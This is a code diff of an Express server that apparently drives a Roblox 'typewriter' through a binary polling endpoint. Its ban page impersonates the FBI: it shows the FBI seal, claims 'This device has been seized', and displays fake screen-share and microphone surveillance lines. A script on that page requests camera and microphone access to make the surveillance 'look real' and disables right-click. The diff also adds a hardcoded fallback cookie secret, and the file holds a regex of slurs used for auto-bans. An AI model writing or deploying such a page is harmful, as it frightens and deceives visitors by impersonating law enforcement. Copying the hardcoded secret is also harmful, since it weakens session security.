@@ -10,8 +10,7 @@ app.set('trust proxy', true);
  */
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD; 
 const MARCUS_SECRET_KEY = process.env.MARCUS_SECRET_KEY;
-// UPDATED COOKIE SECRET
-const COOKIE_SECRET = process.env.COOKIE_SECRET; 
+const COOKIE_SECRET = process.env.COOKIE_SECRET || "donotconnecttotheinternetatmaytenth"; 
 
 const SECRET_PATHS = {
     CONTROL: process.env.PATH_CTRL || "/cx_" + Math.random().toString(36).substring(7),
@@ -26,7 +25,6 @@ let IS_SHUTDOWN = false;
 let BANNED_COOKIES = []; 
 let BANNED_IPS = []; 
 
-// Updated Auto-ban regex for hateful content including EFN/ERN variations
 const forbiddenRegex = /nigger|nigga|pussy|faggot|kike|slut|EFN|ERN|EPSTEIN/i;
 
 app.use(express.json());
@@ -47,36 +45,17 @@ const showBanScreen = (res, ip) => {
         <body style="background:#f0f0f0; color:#000; font-family: serif; text-align:center; padding: 50px; margin:0;">
             <div style="max-width: 800px; margin: auto; border: 12px solid #003366; background: #fff; padding: 40px; box-shadow: 0 0 50px rgba(0,0,0,0.5);">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Seal_of_the_Federal_Bureau_of_Investigation.svg" width="180" style="margin-bottom:20px;">
-                
-                <h1 style="font-size: 36px; color: #003366; margin: 0 0 20px 0; text-transform: uppercase; font-weight: bold;">
-                    This device has been seized
-                </h1>
-                
-                <p style="font-size: 20px; line-height: 1.5; color: #333;">
-                    Your device has been seized and is now being under control over the FBI and your IP: 
-                    <span style="color: red; font-weight: bold; font-family: monospace;">${ip}</span>
-                </p>
-
+                <h1 style="font-size: 36px; color: #003366; margin: 0 0 20px 0; text-transform: uppercase; font-weight: bold;">This device has been seized</h1>
+                <p style="font-size: 20px; line-height: 1.5; color: #333;">Your device has been seized and is now being under control over the FBI and your IP: <span style="color: red; font-weight: bold; font-family: monospace;">${ip}</span></p>
                 <div style="margin: 30px 0; padding: 20px; background: #ffeeee; border: 2px dashed red; text-align: left;">
                     <h3 style="color: red; margin-top:0;">⚠️ LIVE SURVEILLANCE ACTIVE</h3>
                     <p style="font-family: monospace; font-size: 14px; margin: 5px 0;">> INITIALIZING SCREEN_SHARE FEED... <span style="color:green;">[OK]</span></p>
                     <p style="font-family: monospace; font-size: 14px; margin: 5px 0;">> ACCESSING MICROPHONE ARRAY... <span style="color:green;">[OK]</span></p>
                     <p style="font-family: monospace; font-size: 14px; margin: 5px 0;">> UPLOADING LOCAL STORAGE METADATA... <span style="color:green;">[ACTIVE]</span></p>
-                    <div style="width: 100%; height: 10px; background: #ddd; margin-top: 10px;">
-                        <div style="width: 82%; height: 100%; background: red;"></div>
-                    </div>
                 </div>
-
-                <p style="font-size: 14px; color: #777;">
-                    Any attempt to refresh or bypass this screen will result in immediate escalation to your local ISP and Law Enforcement Agency.
-                </p>
             </div>
-            
             <script>
-                // Triggers browser prompts to make the surveillance look real
                 navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(() => {});
-                
-                // Anti-tamper: Block context menu
                 document.addEventListener('contextmenu', event => event.preventDefault());
             </script>
         </body>
@@ -111,14 +90,25 @@ app.use((req, res, next) => {
     next();
 });
 
+/**
+ * 📟 READ ENDPOINT (ROBLOX POLLS THIS)
+ */
 app.get('/typewriter/read', (req, res) => {
-    if (state.queue.length === 0 && !state.isPulsing) state.currentBinary = "00000000";
+    // If we aren't currently "pulsing" a letter and there's something in the queue...
     if (state.queue.length > 0 && !state.isPulsing) {
         const char = state.queue.shift();
         state.isPulsing = true;
+        
+        // 1. Convert char to binary + add "1" at the end for Pin 8 (Next)
         state.currentBinary = char.charCodeAt(0).toString(2).padStart(7, '0') + "1";
-        setTimeout(() => { state.currentBinary = "00000000"; state.isPulsing = false; }, 50); 
+        
+        // 2. After 50ms, reset to 00000000 so the next poll sees a "Low" signal
+        setTimeout(() => { 
+            state.currentBinary = "00000000"; 
+            state.isPulsing = false; 
+        }, 50); 
     }
+    
     res.json({ "value": state.currentBinary, "next": state.currentBinary.endsWith("1") });
 });
 
